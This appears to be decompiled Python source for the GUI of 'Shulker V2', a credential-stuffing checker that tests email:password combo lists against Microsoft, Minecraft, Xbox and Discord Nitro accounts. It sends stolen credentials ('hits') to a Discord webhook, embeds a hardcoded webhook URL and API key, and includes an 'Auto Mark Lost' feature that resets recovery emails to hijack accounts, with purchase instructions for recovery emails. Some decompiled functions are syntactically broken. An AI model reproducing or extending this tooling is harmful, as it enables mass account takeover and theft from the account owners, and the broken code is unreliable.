        self.notletters_api_key_entry = ctk.CTkEntry(self.mark_lost_api_frame, width=400, placeholder_text='Leave empty if buying from Discord seller, or enter your API key if buying from website', show='*')
        self.notletters_api_key_entry.pack(side='left', padx=5, fill='x', expand=True)
        saved_key = self.config.get('automation.notletters_api_key', '')
        default_key = 'vFgjakA5QMdsSKruKwbeaaiHR5cS5KIQ'
        if saved_key and saved_key!= default_key:
                self.notletters_api_key_entry.insert(0, saved_key)
        def toggle_api_key_visibility():
            current_show = self.notletters_api_key_entry.cget('show')
            self.notletters_api_key_entry.configure(show='' if current_show == '*' else '*')
            toggle_btn.configure(text='👁️' if current_show == '*' else '🙈')
        toggle_btn = ctk.CTkButton(self.mark_lost_api_frame, text='👁️', width=40, height=28, command=toggle_api_key_visibility)
        toggle_btn.pack(side='left', padx=2)
        self._update_mark_lost_ui()
        self.after(500, self._check_startup_requirements)
        self._start_email_count_monitor()
        ctk.CTkLabel(checkers_frame, text='🚫 Ban Checkers', font=ctk.CTkFont(size=14, weight='bold')).pack(anchor='w', padx=20, pady=(10, 5))
        self.hypixel_ban_var = ctk.BooleanVar(value=self.config.get('checkers.hypixel_ban_check_enabled', True))
        ctk.CTkCheckBox(checkers_frame, text='Hypixel Ban Check', variable=self.hypixel_ban_var).pack(anchor='w', padx=20, pady=2)
        self.donut_ban_var = ctk.BooleanVar(value=self.config.get('checkers.donut_ban_check_enabled', True))
        ctk.CTkCheckBox(checkers_frame, text='Donut SMP Ban Check', variable=self.donut_ban_var).pack(anchor='w', padx=20, pady=2)
        discord_frame = ctk.CTkFrame(scroll_frame, fg_color=MODERN_COLORS['surface'], corner_radius=15, border_width=1, border_color=MODERN_COLORS['border'])
        discord_frame.pack(fill='x', pady=10, padx=20)
        ctk.CTkLabel(discord_frame, text='💜 Discord Webhook', font=ctk.CTkFont(size=18, weight='bold')).pack(pady=10, anchor='w', padx=10)
        self.discord_enabled_var = ctk.BooleanVar(value=self.config.get('discord.enabled', False))
        discord_checkbox = ctk.CTkCheckBox(discord_frame, text='Enable Discord Webhook', variable=self.discord_enabled_var, command=self.toggle_discord_editor, fg_color=MODERN_COLORS['surface'], hover_color=MODERN_COLORS['surface_hover'], checkmark_color=MODERN_COLORS['text_primary'], border_color=MODERN_COLORS['border'], text_color=MODERN_COLORS['text_primary'])
        discord_checkbox.pack(anchor='w', padx=20, pady=5)
        url_frame = ctk.CTkFrame(discord_frame, fg_color='transparent')
        url_frame.pack(fill='x', pady=5, padx=10)
        ctk.CTkLabel(url_frame, text='Webhook URL:', width=150, anchor='w').pack(side='left', padx=5)
        self.webhook_url_entry = ctk.CTkEntry(url_frame, width=400, placeholder_text='https://discord.com/api/webhooks/...')
        self.webhook_url_entry.pack(side='left', padx=5, fill='x', expand=True)
        webhook_url = self.config.get('discord.webhook_url', '')
        default_webhook = 'https://discord.com/api/webhooks/1392466206551965876/afcaOHCQqubD4WCpzv9Sjftv6KZFeo82B-qjLbiSzQa6vgMhSwRZN4AZ_D8k8f-Xynra'
        if webhook_url and webhook_url!= default_webhook:
                self.webhook_url_entry.insert(0, webhook_url)
        webhook_name_frame = ctk.CTkFrame(discord_frame, fg_color='transparent')
        webhook_name_frame.pack(fill='x', pady=5, padx=10)
        ctk.CTkLabel(webhook_name_frame, text='Webhook Name:', width=150, anchor='w').pack(side='left', padx=5)
        self.webhook_name_entry = ctk.CTkEntry(webhook_name_frame, placeholder_text='Shulker V2')
        self.webhook_name_entry.pack(side='left', padx=5, fill='x', expand=True)
        self.webhook_name_entry.insert(0, self.config.get('discord.username', 'Shulker V2'))
        webhook_icon_frame = ctk.CTkFrame(discord_frame, fg_color='transparent')
        webhook_icon_frame.pack(fill='x', pady=5, padx=10)
        ctk.CTkLabel(webhook_icon_frame, text='Webhook Icon URL:', width=150, anchor='w').pack(side='left', padx=5)
        self.webhook_icon_entry = ctk.CTkEntry(webhook_icon_frame, placeholder_text='https://... (optional)')
        self.webhook_icon_entry.pack(side='left', padx=5, fill='x', expand=True)
        self.webhook_icon_entry.insert(0, self.config.get('discord.avatar_url', ''))
        ctk.CTkLabel(discord_frame, text='What to send:', font=ctk.CTkFont(size=12, weight='bold')).pack(pady=(10, 5), anchor='w', padx=10)
        self.send_minecraft_var = ctk.BooleanVar(value=self.config.get('discord.send_minecraft', True))
        ctk.CTkCheckBox(discord_frame, text='Send Minecraft Hits', variable=self.send_minecraft_var).pack(anchor='w', padx=20, pady=2)
        self.send_nitro_var = ctk.BooleanVar(value=self.config.get('discord.send_nitro', True))
        ctk.CTkCheckBox(discord_frame, text='Send Nitro Hits', variable=self.send_nitro_var).pack(anchor='w', padx=20, pady=2)
        self.send_2fa_var = ctk.BooleanVar(value=self.config.get('discord.send_2fa', False))
        ctk.CTkCheckBox(discord_frame, text='Send 2FA Accounts', variable=self.send_2fa_var).pack(anchor='w', padx=20, pady=2)
        self.send_gamepass_var = ctk.BooleanVar(value=self.config.get('discord.send_gamepass', True))
        ctk.CTkCheckBox(discord_frame, text='Send Game Pass Hits', variable=self.send_gamepass_var).pack(anchor='w', padx=20, pady=2)
        self.send_rewards_var = ctk.BooleanVar(value=self.config.get('discord.send_rewards', True))
        ctk.CTkCheckBox(discord_frame, text='Send MS Rewards Hits', variable=self.send_rewards_var).pack(anchor='w', padx=20, pady=2)
        rewards_threshold_frame = ctk.CTkFrame(discord_frame, fg_color='transparent')
        rewards_threshold_frame.pack(fill='x', pady=5, padx=10)
        ctk.CTkLabel(rewards_threshold_frame, text='Rewards Threshold (points):', width=200, anchor='w', text_color=MODERN_COLORS['text_primary']).pack(side='left', padx=5)
        self.rewards_threshold_var = ctk.IntVar(value=self.config.get('discord.rewards_threshold', 500))
        rewards_entry = ctk.CTkEntry(rewards_threshold_frame, width=100, textvariable=self.rewards_threshold_var, fg_color=MODERN_COLORS['background'], text_color=MODERN_COLORS['text_primary'], border_color=MODERN_COLORS['border'])
        rewards_entry.pack(side='left', padx=5)
        self.embed_editor_frame = ctk.CTkFrame(scroll_frame, fg_color=MODERN_COLORS['surface'], corner_radius=15, border_width=1, border_color=MODERN_COLORS['border'])
        header_frame = ctk.CTkFrame(self.embed_editor_frame, fg_color='transparent')
        header_frame.pack(fill='x', pady=(10, 5), padx=10)
        ctk.CTkLabel(header_frame, text='🎨 Embed Message Editor', font=ctk.CTkFont(size=20, weight='bold')).pack(side='left', padx=10, pady=10)
        self.use_custom_embed_var = ctk.BooleanVar(value=self.config.get('discord.use_custom_embed', False))
        custom_toggle = ctk.CTkCheckBox(header_frame, text='Use Custom Embed', variable=self.use_custom_embed_var, font=ctk.CTkFont(size=12, weight='bold'))
        custom_toggle.pack(side='right', padx=10, pady=10)
        main_content = ctk.CTkFrame(self.embed_editor_frame, fg_color='transparent')
        main_content.pack(fill='both', expand=True, padx=10, pady=5)
        left_col = ctk.CTkFrame(main_content, fg_color='transparent')
        left_col.pack(side='left', fill='both', expand=True, padx=(0, 5))
        ctk.CTkLabel(left_col, text='📝 Edit Embed', font=ctk.CTkFont(size=16, weight='bold')).pack(pady=(10, 15), padx=10, anchor='w')
        title_section = ctk.CTkFrame(left_col, fg_color='transparent')
        title_section.pack(fill='x', pady=8, padx=10)
        ctk.CTkLabel(title_section, text='Title:', font=ctk.CTkFont(size=12, weight='bold'), width=100, anchor='w').pack(side='left', padx=5)
        self.embed_title_entry = ctk.CTkEntry(title_section, placeholder_text='🎮 NEW HIT - {email}', height=35)
        self.embed_title_entry.pack(side='left', padx=5, fill='x', expand=True)
        self.embed_title_entry.insert(0, self.config.get('discord.embed_title', '🎮 NEW HIT - {email}'))
        desc_section = ctk.CTkFrame(left_col, fg_color='transparent')
        desc_section.pack(fill='x', pady=8, padx=10)
        ctk.CTkLabel(desc_section, text='Description:', font=ctk.CTkFont(size=12, weight='bold'), width=100, anchor='w').pack(side='left', padx=5, anchor='n', pady=(5, 0))
        self.embed_desc_entry = ctk.CTkTextbox(desc_section, height=100, font=ctk.CTkFont(size=11))
        self.embed_desc_entry.pack(side='left', padx=5, fill='x', expand=True)
        self.embed_desc_entry.insert('1.0', self.config.get('discord.embed_description', '**Credentials:** `{email}:{password}`'))
        color_footer_row = ctk.CTkFrame(left_col, fg_color='transparent')
        color_footer_row.pack(fill='x', pady=8, padx=10)
        color_section = ctk.CTkFrame(color_footer_row, fg_color='transparent')
        color_section.pack(side='left', fill='x', expand=True, padx=(0, 5))
        ctk.CTkLabel(color_section, text='Color:', font=ctk.CTkFont(size=12, weight='bold'), anchor='w').pack(padx=5, pady=2)
        self.embed_color_entry = ctk.CTkEntry(color_section, placeholder_text='0x57F287 (auto if empty)', height=35)
        self.embed_color_entry.pack(padx=5, pady=2, fill='x')
        self.embed_color_entry.insert(0, self.config.get('discord.embed_color', ''))
        footer_row = ctk.CTkFrame(left_col, fg_color='transparent')
        footer_row.pack(fill='x', pady=8, padx=10)
        footer_section = ctk.CTkFrame(footer_row, fg_color='transparent')
        footer_section.pack(side='left', fill='x', expand=True, padx=(0, 5))
        ctk.CTkLabel(footer_section, text='Footer Text:', font=ctk.CTkFont(size=12, weight='bold'), anchor='w').pack(padx=5, pady=2)
        self.embed_footer_entry = ctk.CTkEntry(footer_section, placeholder_text='Shulker V2 • {timestamp}', height=35)
        self.embed_footer_entry.pack(padx=5, pady=2, fill='x')
        self.embed_footer_entry.insert(0, self.config.get('discord.embed_footer', 'Shulker V2 • {timestamp}'))
        footer_icon_section = ctk.CTkFrame(footer_row, fg_color='transparent')
        footer_icon_section.pack(side='left', fill='x', expand=True, padx=(5, 0))
        ctk.CTkLabel(footer_icon_section, text='Footer Icon URL:', font=ctk.CTkFont(size=12, weight='bold'), anchor='w').pack(padx=5, pady=2)
        self.embed_footer_icon_entry = ctk.CTkEntry(footer_icon_section, placeholder_text='https://... (optional)', height=35)
        self.embed_footer_icon_entry.pack(padx=5, pady=2, fill='x')
        self.embed_footer_icon_entry.insert(0, self.config.get('discord.embed_footer_icon', ''))
        fields_section = ctk.CTkFrame(left_col, fg_color='transparent')
        fields_section.pack(fill='both', expand=True, pady=8, padx=10)
        fields_header = ctk.CTkFrame(fields_section, fg_color='transparent')
        fields_header.pack(fill='x', pady=(10, 5), padx=5)
        ctk.CTkLabel(fields_header, text='📋 Custom Fields', font=ctk.CTkFont(size=14, weight='bold')).pack(side='left', padx=5)
        add_field_btn = ctk.CTkButton(fields_header, text='+ Add Field', width=100, height=30, command=self.add_embed_field)
        add_field_btn.pack(side='right', padx=5)
        self.fields_scroll_frame = ctk.CTkScrollableFrame(fields_section, height=300, fg_color=MODERN_COLORS['surface'])
        self.fields_scroll_frame.pack(padx=5, pady=(0, 10), fill='both', expand=True)
        self.embed_field_widgets = []
        custom_fields = self.config.get('discord.embed_fields', [])
        if custom_fields:
            for field in custom_fields:
                self.add_embed_field(name=field.get('name', ''), value=field.get('value', ''), inline=field.get('inline', False))
        else:
            self.add_embed_field('🎮 Minecraft', 'Java: {mc_java_owned} | Bedrock: {mc_bedrock_owned}', True)
            self.add_embed_field('🔒 Security', '{security_status}', True)
            self.add_embed_field('💜 Nitro', '{nitro_status}', False)
        right_col = ctk.CTkFrame(main_content, fg_color='transparent')
        right_col.pack(side='right', fill='both', expand=False, padx=(5, 0), ipadx=10)
        ctk.CTkLabel(right_col, text='📚 Available Variables', font=ctk.CTkFont(size=16, weight='bold')).pack(pady=(10, 10), padx=10, anchor='w')
        variables_scroll = ctk.CTkScrollableFrame(right_col, width=300, fg_color=MODERN_COLORS['surface'])
        variables_scroll.pack(fill='both', expand=True, padx=10, pady=(0, 10))
        variables_list = [('{email}', 'Account email'), ('{password}', 'Account password'), ('{mc_username}', 'Minecraft username'), ('{mc_uuid}', 'Minecraft UUID'), ('{mc_java_owned}', 'Java owned (Yes/No)'), ('{mc_bedrock_owned}', 'Bedrock owned (Yes/No)'), ('{mc_gamepass}', 'Has Game Pass (Yes/No)'), ('{xbox_gamertag}', 'Xbox gamertag'), ('{nitro_status}', 'Nitro status'), ('{nitro_code}', 'Nitro promo code'), ('{nitro_link}', 'Nitro redemption link'), ('{security_status}', 'Security status'), ('{hypixel_level}', 'Hypixel level'), ('{hypixel_rank}', 'Hypixel rank'), ('{hypixel_banned}', 'Hypixel ban status'), ('{donut_balance}', 'Donut SMP balance'), ('{donut_playtime}', 'Donut SMP playtime'), ('{rewards_points}', 'MS Rewards points'), ('{capes}', 'Minecraft capes'), ('{name_changeable}', 'Can change name (Yes/No)'), ('{timestamp}', 'Current timestamp')]
        for var, desc in variables_list:
            var_frame = ctk.CTkFrame(variables_scroll, fg_color='transparent')
            var_frame.pack(fill='x', pady=3, padx=5)
            var_label = ctk.CTkLabel(var_frame, text=var, font=ctk.CTkFont(size=11, family='Consolas'), text_color=MODERN_COLORS['primary'], anchor='w', width=150)
            var_label.pack(side='left', padx=5)
            desc_label = ctk.CTkLabel(var_frame, text=desc, font=ctk.CTkFont(size=10), text_color=MODERN_COLORS['text_secondary'], anchor='w')
            desc_label.pack(side='left', padx=5, fill='x', expand=True)
        self.toggle_discord_editor()
        timeouts_frame = ctk.CTkFrame(scroll_frame, fg_color=MODERN_COLORS['surface'], corner_radius=15, border_width=1, border_color=MODERN_COLORS['border'])
        timeouts_frame.pack(fill='x', pady=10, padx=20)
        ctk.CTkLabel(timeouts_frame, text='⏱️ Timeout Settings (seconds)', font=ctk.CTkFont(size=18, weight='bold')).pack(pady=10, anchor='w', padx=10)
        timeout_grid = [('Authentication', 'timeouts.authentication', 30), ('Security Check', 'timeouts.security_check', 15), ('Minecraft Check', 'timeouts.minecraft_check', 20), ('Xbox Check', 'timeouts.xbox_check', 15), ('Nitro Check', 'timeouts.nitro_check', 30), ('Hypixel Check', 'timeouts.hypixel_check', 10), ('Donut Check', 'timeouts.donut_check', 10), ('Mark Lost', 'timeouts.mark_lost', 60)]
        self.timeout_vars = {}
        for i, (label, key, default) in enumerate(timeout_grid):
            row_frame = ctk.CTkFrame(timeouts_frame, fg_color='transparent')
            row_frame.pack(fill='x', pady=2, padx=10)
            ctk.CTkLabel(row_frame, text=f'{label}:', width=180, anchor='w').pack(side='left', padx=5)
            var = ctk.IntVar(value=self.config.get(key, default))
            self.timeout_vars[key] = var
            entry = ctk.CTkEntry(row_frame, width=80, textvariable=var)
            entry.pack(side='left', padx=5)
        rate_frame = ctk.CTkFrame(scroll_frame, fg_color=MODERN_COLORS['surface'], corner_radius=15, border_width=1, border_color=MODERN_COLORS['border'])
        rate_frame.pack(fill='x', pady=10, padx=20)
        ctk.CTkLabel(rate_frame, text='🚦 Rate Limiting', font=ctk.CTkFont(size=18, weight='bold')).pack(pady=10, anchor='w', padx=10)
        self.rate_limiting_enabled_var = ctk.BooleanVar(value=self.config.get('rate_limiting.enabled', True))
        ctk.CTkCheckBox(rate_frame, text='Enable Rate Limiting', variable=self.rate_limiting_enabled_var).pack(anchor='w', padx=20, pady=5)
        global_delay_frame = ctk.CTkFrame(rate_frame, fg_color='transparent')
        global_delay_frame.pack(fill='x', pady=5, padx=10)
        ctk.CTkLabel(global_delay_frame, text='Global Delay (seconds):', width=200, anchor='w').pack(side='left', padx=5)
        self.global_delay_var = ctk.DoubleVar(value=self.config.get('rate_limiting.global_delay', 0.5))
        delay_entry = ctk.CTkEntry(global_delay_frame, width=100, textvariable=self.global_delay_var)
        delay_entry.pack(side='left', padx=5)
        logging_frame = ctk.CTkFrame(scroll_frame, fg_color=MODERN_COLORS['surface'], corner_radius=15, border_width=1, border_color=MODERN_COLORS['border'])
        logging_frame.pack(fill='x', pady=10, padx=20)
        ctk.CTkLabel(logging_frame, text='📝 Logging Settings', font=ctk.CTkFont(size=18, weight='bold')).pack(pady=10, anchor='w', padx=10)
        log_level_frame = ctk.CTkFrame(logging_frame, fg_color='transparent')
        log_level_frame.pack(fill='x', pady=5, padx=10)
        ctk.CTkLabel(log_level_frame, text='Log Level:', width=150, anchor='w').pack(side='left', padx=5)
        self.log_level_var = ctk.StringVar(value=self.config.get('logging.level', 'INFO'))
        log_level_menu = ctk.CTkOptionMenu(log_level_frame, values=['DEBUG', 'INFO', 'WARNING', 'ERROR'], variable=self.log_level_var, width=150)
        log_level_menu.pack(side='left', padx=5)
        save_frame = ctk.CTkFrame(scroll_frame, fg_color='transparent')
        save_frame.pack(fill='x', pady=20, padx=20)
        ctk.CTkButton(save_frame, text='💾 Save All Configuration', command=self.save_all_config, width=300, height=40, font=ctk.CTkFont(size=16, weight='bold')).pack(pady=10)
    def create_logs_tab(self):
        """Create live logs tab"""
        ctk.CTkLabel(self.tab_logs, text='📋 LIVE LOGS', font=ctk.CTkFont(size=24, weight='bold')).pack(pady=20)
        control_frame = ctk.CTkFrame(self.tab_logs, fg_color=MODERN_COLORS['surface'], corner_radius=10, border_width=1, border_color=MODERN_COLORS['border'])
        control_frame.pack(fill='x', padx=20, pady=10)
        ctk.CTkButton(control_frame, text='🗑️ Clear Logs', command=self.clear_logs, width=120, fg_color=MODERN_COLORS['surface'], hover_color=MODERN_COLORS['surface_hover'], text_color=MODERN_COLORS['text_primary']).pack(side='left', padx=5)
        ctk.CTkButton(control_frame, text='💾 Save Logs', command=self.save_logs, width=120, fg_color=MODERN_COLORS['surface'], hover_color=MODERN_COLORS['surface_hover'], text_color=MODERN_COLORS['text_primary']).pack(side='left', padx=5)
        self.log_text = ctk.CTkTextbox(self.tab_logs, font=ctk.CTkFont(size=10, family='Consolas'), wrap='none', fg_color=MODERN_COLORS['background'], text_color=MODERN_COLORS['text_primary'], corner_radius=10, border_width=1, border_color=MODERN_COLORS['border'])
        self.log_text.pack(fill='both', expand=True, padx=20, pady=10)
        self.log_text.tag_config('bad', foreground='#ff4444')
        self.log_text.tag_config('valid', foreground='#4488ff')
        self.log_text.tag_config('2fa', foreground='#44ffff')
        self.log_text.tag_config('hit', foreground='#44ff44')
        self.log_text.tag_config('xgp', foreground='#22aa22')
        self.log_text.tag_config('xgpu', foreground='#22aa22')
        self.log_handler = LogHandler(self.log_text, self)
        self.update_logs()
    def create_stats_tab(self):
        """Create detailed statistics tab"""
        ctk.CTkLabel(self.tab_stats, text='📊 DETAILED STATISTICS', font=ctk.CTkFont(size=24, weight='bold')).pack(pady=20)
        self.stats_table = StatsTable(self.tab_stats)
        self.stats_table.pack(fill='both', expand=True, padx=20, pady=10)
    def create_results_tab(self):
        """Create results viewer tab"""
        # ***<module>.ShulkerApp.create_results_tab: Failure: Different bytecode
        ctk.CTkLabel(self.tab_results, text='📁 RESULTS VIEWER', font=ctk.CTkFont(size=24, weight='bold'), text_color=MODERN_COLORS['text_primary']).pack(pady=20)
        session_frame = ctk.CTkFrame(self.tab_results, fg_color=MODERN_COLORS['surface'], corner_radius=10, border_width=1, border_color=MODERN_COLORS['border'])
        session_frame.pack(fill='x', padx=20, pady=10)
        ctk.CTkLabel(session_frame, text='Session:', width=100, text_color=MODERN_COLORS['text_primary']).pack(side='left', padx=10)
        self.session_var = ctk.StringVar()
        self.session_dropdown = ctk.CTkComboBox(session_frame, variable=self.session_var, values=self.get_session_folders(), command=self.load_session_files, width=300, fg_color=MODERN_COLORS['surface'], button_color=MODERN_COLORS['primary'], button_hover_color=MODERN_COLORS['primary_hover'], text_color=MODERN_COLORS['text_primary'])
        self.session_dropdown.pack(side='left', padx=10)
        ctk.CTkButton(session_frame, text='🔄 Refresh', command=self.refresh_sessions, width=100, fg_color=MODERN_COLORS['surface'], hover_color=MODERN_COLORS['surface_hover'], text_color=MODERN_COLORS['text_primary']).pack(side='left', padx=10)
        files_frame = ctk.CTkFrame(self.tab_results, fg_color=MODERN_COLORS['background'], corner_radius=0)
        files_frame.pack(fill='both', expand=True, padx=20, pady=10)
        list_frame = ctk.CTkFrame(files_frame, fg_color=MODERN_COLORS['surface'], corner_radius=10, border_width=1, border_color=MODERN_COLORS['border'])
        list_frame.pack(side='left', fill='both', expand=True, padx=(0, 10))
        ctk.CTkLabel(list_frame, text='📄 Files:', font=ctk.CTkFont(size=14, weight='bold'), text_color=MODERN_COLORS['text_primary']).pack(pady=10)
        self.files_scroll = ctk.CTkScrollableFrame(list_frame, height=400, fg_color=MODERN_COLORS['background'], corner_radius=0)
        self.files_scroll.pack(fill='both', expand=True, padx=10, pady=10)
        self.file_buttons = {}
        content_frame = ctk.CTkFrame(files_frame, fg_color=MODERN_COLORS['surface'], corner_radius=10, border_width=1, border_color=MODERN_COLORS['border'])
        content_frame.pack(side='right', fill='both', expand=True, padx=(10, 0))
        ctk.CTkLabel(content_frame, text='📋 Content:', font=ctk.CTkFont(size=14, weight='bold'), text_color=MODERN_COLORS['text_primary']).pack(pady=10)
        self.file_content_text = ctk.CTkTextbox(content_frame, font=ctk.CTkFont(size=10, family='Consolas'), height=400, fg_color=MODERN_COLORS['background'], text_color=MODERN_COLORS['text_primary'], corner_radius=10, border_width=1, border_color=MODERN_COLORS['border'])
        self.file_content_text.pack(fill='both', expand=True, padx=10, pady=10)
    def create_status_bar(self):
        """Create beautiful status bar"""
        status_frame = ctk.CTkFrame(self, height=35, corner_radius=0, fg_color=MODERN_COLORS['surface'], border_width=1, border_color=MODERN_COLORS['border'])
        status_frame.grid(row=2, column=0, sticky='ew', padx=0, pady=0)
        status_frame.grid_propagate(False)
        self.status_label = ctk.CTkLabel(status_frame, text='Ready • Complete Edition with Smart Threading', font=ctk.CTkFont(size=11), text_color=MODERN_COLORS['text_primary'])
        self.status_label.pack(side='left', padx=15, pady=8)
        version_label = ctk.CTkLabel(status_frame, text=f'v{self.config.get('general.version')}', font=ctk.CTkFont(size=11, weight='bold'), text_color=MODERN_COLORS['text_secondary'])
        version_label.pack(side='right', padx=15, pady=8)
    def browse_combo_file(self):
        # irreducible cflow, using cdg fallback
        """Browse for combo file"""
        # ***<module>.ShulkerApp.browse_combo_file: Failure: Compilation Error
        filename = filedialog.askopenfilename(title='Select Combo File', filetypes=[('Text Files', '*.txt'), ('All Files', '*.*')], initialdir='combos')
        if filename:
            pass
        if not os.path.exists(filename):
            messagebox.showerror('Error', 'File does not exist')
                return
            if not os.access(filename, os.R_OK):
                messagebox.showerror('Error', 'File is not readable')
                    return
                with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
                    lines = [line.strip() for line in f if ':' in line.strip()]
                if not lines:
                    messagebox.showerror('Error', 'File contains no valid accounts (email:password format)')
                        return
                    self.combo_file = filename
                    self.combo_file_label.configure(text=f'Combo File: {os.path.basename(filename)} ({len(lines)} accounts)')
                    self.start_btn.configure(state='normal')
                    logger.info(f'Selected combo file: {filename} ({len(lines)} accounts)')
                except Exception as e:
                        messagebox.showerror('Error', f'Failed to validate file: {e}')
                        logger.error(f'File validation error: {e}')
    def update_thread_count(self, value):
        """Update thread count from slider with smooth animation"""
        count = int(value)
        self.settings['thread_count'] = count
        if hasattr(self, 'thread_label'):
            self.thread_label.configure(text=f'{count} threads')
    def toggle_proxies(self):
        """Toggle proxy mode"""
        self.settings['proxy_enabled'] = self.proxy_check.get()
        self.config.set('proxies.enabled', self.settings['proxy_enabled'])
        self.config.save()
        status = 'enabled' if self.settings['proxy_enabled'] else 'disabled'
        self.status_label.configure(text=f'Proxies {status}')
        logger.info(f'Proxies {status}')
    def toggle_discord(self):
        """Toggle Discord webhook"""
        self.settings['discord_enabled'] = self.discord_check.get()
        self.discord_enabled_var.set(self.settings['discord_enabled'])
        self.config.set('discord.enabled', self.settings['discord_enabled'])
        self.config.save()
        self.toggle_discord_editor()
        status = 'enabled' if self.settings['discord_enabled'] else 'disabled'
        self.status_label.configure(text=f'Discord webhook {status}')
        logger.info(f'Discord webhook {status}')
    def _on_rewards_checkbox_change(self):
        """Handle MS Rewards checkbox change - show beta warning if enabling"""
        if self.rewards_var.get():
            response = messagebox.askyesno('Beta Feature Warning', '⚠️ Microsoft Rewards Fetcher is currently in BETA stage.\n\n⚠️ Turning this feature ON will decrease checking speed.\n\nThis feature is still under development and may have:\n• Slower performance\n• Potential instability\n• Unexpected behavior\n\nDo you want to enable this beta feature?', icon='warning')
            if not response:
                self.rewards_var.set(False)
            else:
                logger.info('User enabled MS Rewards (Beta feature)')
    def _count_notletters_emails(self):
        # irreducible cflow, using cdg fallback
        """Count valid NotLetters emails from file"""
        # ***<module>.ShulkerApp._count_notletters_emails: Failure: Compilation Error
        email_file = self.config.get('automation.notletters_email_file', 'notletters_emails.txt')
        email_count = 0
        if os.path.exists(email_file):
            with open(email_file, 'r', encoding='utf-8') as f:
                for line in f:
                    line = line.strip()
                    if line and (not line.startswith('#')) and (':' in line):
                                email, password = line.split(':', 1)
                                if email.strip() and password.strip():
                                        email_count += 1
                        return email_count
                        return email_count
                except Exception as e:
                        logger.error(f'Error counting NotLetters emails: {e}')
    def _refresh_email_count(self):
        """Refresh and display email count"""
        email_count = self._count_notletters_emails()
        if email_count >= 50:
            self.mark_lost_email_count_label.configure(text=f'✅ {email_count} emails found (requirements met)', text_color='#44ff44')
        else:
            self.mark_lost_email_count_label.configure(text=f'❌ {email_count}/50 emails found (need {50 - email_count} more)', text_color='#ff4444')
        if self.mark_lost_var.get():
            if email_count < 50:
                self.mark_lost_var.set(False)
                self.mark_lost_requirements_satisfied = False
                self._update_mark_lost_ui()
                logger.warning(f'Auto Mark Lost auto-disabled: Only {email_count}/50 emails found')
                return email_count
            else:
                self.mark_lost_requirements_satisfied = True
        return email_count
    def _check_startup_requirements(self):
        """Check requirements on startup if Auto Mark Lost is enabled"""
        if self.mark_lost_var.get():
            email_count = self._count_notletters_emails()
            if email_count >= 50:
                self.mark_lost_requirements_satisfied = True
                logger.info(f'Auto Mark Lost enabled on startup with {email_count} emails (requirements satisfied)')
            else:
                self.mark_lost_requirements_satisfied = False
                self.mark_lost_var.set(False)
                self._update_mark_lost_ui()
                messagebox.showwarning('Auto Mark Lost Disabled', f'Auto Mark Lost was enabled but has been automatically disabled.\n\nReason: Only {email_count}/50 NotLetters emails found.\nPlease add at least {50 - email_count} more emails to notletters_emails.txt\n\nClick the Refresh button after adding emails, then enable Auto Mark Lost again.')
                logger.warning(f'Auto Mark Lost auto-disabled on startup: Only {email_count}/50 emails found')
        self._refresh_email_count()
    def _start_email_count_monitor(self):
        """Start periodic email count monitoring"""
        if self.mark_lost_var.get():
            self._refresh_email_count()
        self.after(30000, self._start_email_count_monitor)
    def _on_mark_lost_checkbox_change(self):
        """Handle Auto Mark Lost checkbox change - prevent enabling if requirements not met"""
        if self.mark_lost_var.get():
            email_count = self._count_notletters_emails()
            if email_count < 50:
                self.mark_lost_var.set(False)
                error_text = f'❌ REQUIREMENTS NOT MET\n\n📧 NotLetters Emails: {email_count}/50 required\n❌ You need at least 50 emails!\n\n📋 REQUIREMENTS:\n• Minimum 50 NotLetters email:password pairs in notletters_emails.txt\n• Format: email:password (one per line)\n• Comments (lines starting with #) are ignored\n• ShulkerV2 uses these emails as recovery emails to mark lost Minecraft hits\n\n🔗 DEPENDENCY:\nShulkerV2 is dependent on https://notletters.com/ for the auto mark lost system.\n\n💰 WHERE TO BUY:\n1. Website: https://notletters.com/\n   → Create an account and purchase NotLetters emails\n   → Get your API key from Settings tab on their website\n   → Enter your API key in the field below (after enabling)\n\n2. Discord Seller: someone_known21 (ID: 793101872784867352)\n   → Contact them on Discord to purchase NotLetters emails\n   → Leave API key field EMPTY (default key will be used)\n   → Do NOT enter anything in the API key field\n\n📝 HOW TO ADD EMAILS:\n1. Open notletters_emails.txt file (in the same folder as ShulkerV2)\n2. Add email:password pairs, one per line\n3. Example format:\n   email1@example.com:password1\n   email2@example.com:password2\n4. Save the file\n5. Click the Refresh button to update the count\n6. Once you have 50+ emails, you can enable Auto Mark Lost\n\n⚠️ CURRENT STATUS:\n• Found: {email_count} emails\n• Required: 50 emails\n• Missing: {50 - email_count} emails\n\nAfter adding emails, click Refresh to check again.'
                messagebox.showerror('Cannot Enable Auto Mark Lost', error_text)
                self._update_mark_lost_ui()
                logger.warning(f'Cannot enable Auto Mark Lost: Only {email_count}/50 emails found')
                return
            else:
                warning_text = f'⚠️ AUTO MARK LOST REQUIREMENTS\n\n📧 NotLetters Emails: {email_count}/50 required\n✅ You have enough emails!\n\n📋 REQUIREMENTS:\n• Minimum 50 NotLetters email:password pairs in notletters_emails.txt\n• Format: email:password (one per line)\n• ShulkerV2 uses these emails as recovery emails to mark lost Minecraft hits\n\n🔗 DEPENDENCY:\nShulkerV2 is dependent on https://notletters.com/ for the auto mark lost system.\n\n💰 WHERE TO BUY:\n1. Website: https://notletters.com/\n   → Get your API key from Settings tab on their website\n   → Enter your API key in the field below\n\n2. Discord Seller: someone_known21 (ID: 793101872784867352)\n   → Leave API key field EMPTY\n   → Default key will be used automatically\n   → Do NOT enter anything in the API key field\n\n⚠️ IMPORTANT:\n• Auto Mark Lost only works on accounts with Minecraft Java OWNED\n• The system uses NotLetters emails as recovery emails\n• Make sure you have valid NotLetters email:password pairs\n\nDo you want to enable Auto Mark Lost?'
                response = messagebox.askyesno('Auto Mark Lost - Requirements', warning_text, icon='question')
                if not response:
                    self.mark_lost_var.set(False)
                    self._update_mark_lost_ui()
                    return
                else:
                    self.mark_lost_requirements_satisfied = True
                    logger.info(f'User enabled Auto Mark Lost with {email_count} emails (requirements satisfied)')
                    self._update_mark_lost_ui()
                    return
        else:
            self.mark_lost_requirements_satisfied = False
            self._update_mark_lost_ui()
    def _update_mark_lost_ui(self):
        """Update Auto Mark Lost UI visibility based on checkbox state"""
        if self.mark_lost_var.get():
            email_count = self._count_notletters_emails()
            if email_count >= 50:
                info_text = f'✅ {email_count} emails found | ShulkerV2 depends on https://notletters.com/ | Buy from website (enter API key) or someone_known21 (Discord: 793101872784867352, leave API key empty)'
                self.mark_lost_info_label.configure(text=info_text, text_color='#44ff44')
            else:
